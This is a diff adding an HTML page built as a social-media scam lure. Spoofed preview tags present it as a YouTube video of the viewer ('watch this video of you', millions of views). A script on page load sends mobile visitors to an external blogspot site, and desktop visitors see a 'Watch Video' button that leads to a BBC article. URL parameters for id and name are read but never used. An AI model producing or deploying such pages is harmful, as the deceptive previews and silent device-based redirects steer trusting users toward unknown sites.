@@ -1,0 +1,62 @@
+<html>
+<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<meta property="og:title" content="watch this video of you Ã°Å¸ËœÂ±" />
+<meta property="og:description" content="4.043.882 Views" />
+<meta property="og:url"                content="https://www.youtube.com" />
+  <link rel="manifest" href="/manifest.json">
+  <script src="//codesandbox.io/static/browserfs3/browserfs.min.js" type="text/javascript"></script>
+
+<script>
+  window.process = BrowserFS.BFSRequire('process');
+  window.Buffer = BrowserFS.BFSRequire('buffer').Buffer;
+</script>
+</head>
+<style>
+.button {
+    background-color: #6fa8dc;
+    border: none;
+    color: white;
+    padding: 35px 62px;
+    text-align: center;
+    text-decoration: none;
+    display: inline-block;
+    font-size: 20px;
+    margin: 4px 2px;
+    cursor: pointer;
+}
+</style>
+<p id="demo">
+
+</p>
+<script type="text/javascript">
+
+function generateRandomString(iLen) {
+    var sRnd = '';
+    var sChrs = "abcdefghiklmnopqrstuvwxyz";
+    for (var i = 0; i < iLen; i++) {
+      var randomPoz = Math.floor(Math.random() * sChrs.length);
+      sRnd += sChrs.substring(randomPoz, randomPoz + 1);
+    }
+    return sRnd;
+  }
+
+function getUrlVars() {
+    var vars = {};
+    var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
+        vars[key] = value;
+    });
+    return vars;
+}
+var id = getUrlVars()["id"];
+var name = getUrlVars()["name"];
+function visitPage(){
+        window.location = "https://www.bbc.com/news/technology-45940777";
+    }
+
+        if (screen.width <= 720) {
+        window.location = "https://onevideoli.blogspot.com";
+    } else {
+       document.getElementById("demo").innerHTML ="<h1><button class=button onclick=visitPage();> Watch Video</button></h1>"
+    }
+
+</script>
